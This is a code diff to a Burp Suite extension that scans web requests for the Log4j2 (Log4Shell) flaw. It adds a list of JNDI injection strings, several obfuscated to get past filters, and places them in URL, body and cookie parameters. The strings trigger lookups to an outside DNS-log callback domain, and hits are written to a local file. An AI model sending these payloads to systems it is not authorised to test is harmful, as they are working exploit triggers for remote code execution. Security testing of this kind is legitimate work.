@@ -11,6 +11,7 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.io.*;
 
 public class Log4j2Scanner implements IScannerCheck {
     private BurpExtender parent;
@@ -21,7 +22,7 @@ public class Log4j2Scanner implements IScannerCheck {
     public Log4j2Scanner(final BurpExtender newParent) {
         this.parent = newParent;
         this.helper = newParent.helpers;
-        this.dnslog = new DnslogCN();
+        this.dnslog = new Ceye();
         if (this.dnslog.getState()) {
             parent.stdout.println("Log4j2Scan loaded successfully!\r\n");
         } else {
@@ -33,57 +34,102 @@ public class Log4j2Scanner implements IScannerCheck {
     public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
         IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
         List<IScanIssue> issues = new ArrayList<>();
+        ArrayList<String> payloads = new ArrayList<String>();
+        payloads.add("${jndi:ldap://");
+        payloads.add("${jndi:rmi://");
+        payloads.add("${${lower:jndi}:${lower:ldap}://");
+        payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://");
+        payloads.add("${${lower:${lower:jndi}}:${lower:ldap}://");
+        payloads.add("${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://");
         Map<String, ScanItem> domainMap = new HashMap<>();
         byte[] rawRequest = baseRequestResponse.getRequest();
-        for (IParameter param :
-                req.getParameters()) {
-            try {
-                String tmpDomain = dnslog.getNewDomain();
-                byte[] tmpRawRequest = rawRequest;
-                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
-                boolean hasModify = false;
-                switch (param.getType()) {
-                    case IParameter.PARAM_URL:
-                    case IParameter.PARAM_BODY:
-                    case IParameter.PARAM_COOKIE:
-                        exp = helper.urlEncode(exp);
-                        IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
-                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
-                        hasModify = true;
-                        break;
-                    case IParameter.PARAM_JSON:
-                    case IParameter.PARAM_XML:
-                    case IParameter.PARAM_MULTIPART_ATTR:
-                    case IParameter.PARAM_XML_ATTR:
-                        //unsupported.
-                }
-                if (hasModify) {
-                    IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
-                    tmpReq.getResponse();
-                    domainMap.put(tmpDomain, new ScanItem(param, tmpReq));
+        byte[] tmpRawRequest = rawRequest;
+        boolean hasModify = false;
+        IParameter newParam;
+        for (String payload : payloads){
+            String tmpDomain = dnslog.getNewDomain();
+            for (IParameter param :
+                    req.getParameters()) {
+                try {
+                    String exp = payload + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) +"}";
+                    switch (param.getType()) {
+                        case IParameter.PARAM_URL:
+                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
+                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
+                            hasModify = true;
+                            break;
+                        case IParameter.PARAM_BODY:
+                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
+                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
+                            hasModify = true;
+                            break;
+                        case IParameter.PARAM_COOKIE:
+                            newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
+                            tmpRawRequest = parent.helpers.updateParameter(tmpRawRequest, newParam);
+                            hasModify = true;
+                            break;
+                        case IParameter.PARAM_JSON:
+                        case IParameter.PARAM_XML:
+                        case IParameter.PARAM_MULTIPART_ATTR:
+                        case IParameter.PARAM_XML_ATTR:
+                            //unsupported.
+                    }
 
-                }
-            } catch (Exception ex) {
-                System.out.println(ex);
-            }
-        }
-        if (dnslog.flushCache()) {
-            for (Map.Entry<String, ScanItem> domainItem :
-                    domainMap.entrySet()) {
-                ScanItem item = domainItem.getValue();
-                boolean hasIssue = dnslog.CheckResult(domainItem.getKey());
-                if (hasIssue) {
-                    issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
-                            req.getUrl(),
-                            new IHttpRequestResponse[]{baseRequestResponse, item.TmpRequest},
-                            "Log4j2 RCE Detected",
-                            String.format("Vulnerable param is \"%s\" in %s.", item.Param.getName(), getTypeName(item.Param.getType())),
-                            "High"));
+                } catch (Exception ex) {
+                    System.out.println(ex);
                 }
             }
-        } else {
-            parent.stdout.println("get dnslog result failed!\r\n");
+            if (hasModify) {
+                String str = new String(tmpRawRequest);
+                parent.stdout.println(str);
+                IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
+                tmpReq.getResponse();
+                if(dnslog.flushCache()){
+                    parent.stdout.println("checking start...");
+                    boolean hasIssue = dnslog.CheckResult(tmpDomain);
+                    parent.stdout.println("checking done...");
+                    parent.stdout.println("\n");
+                    parent.stdout.println("\n");
+                    if (hasIssue) {
+                        FileWriter fw = null;
+                        try {
+                            File f=new File("log4j2scan.txt");
+                            fw = new FileWriter(f, true);
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                        PrintWriter pw = new PrintWriter(fw);
+                        pw.println(req.getUrl().toString());
+                        pw.println("");
+                        pw.println("");
+                        pw.println("");
+                        pw.println(str);
+                        pw.println("");
+                        pw.println("=======================");
+                        pw.flush();
+                        try {
+                            fw.flush();
+                            pw.close();
+                            fw.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                        issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
+                                req.getUrl(),
+                                new IHttpRequestResponse[]{baseRequestResponse, tmpReq},
+                                "Log4j2 RCE Detected",
+                                String.format("Vulnerable param is %s.", req.getUrl()),
+                                "High"));
+                        break;
+                    }
+                }
+
+
+
+            }
         }
+
+
         return issues;
     }
 
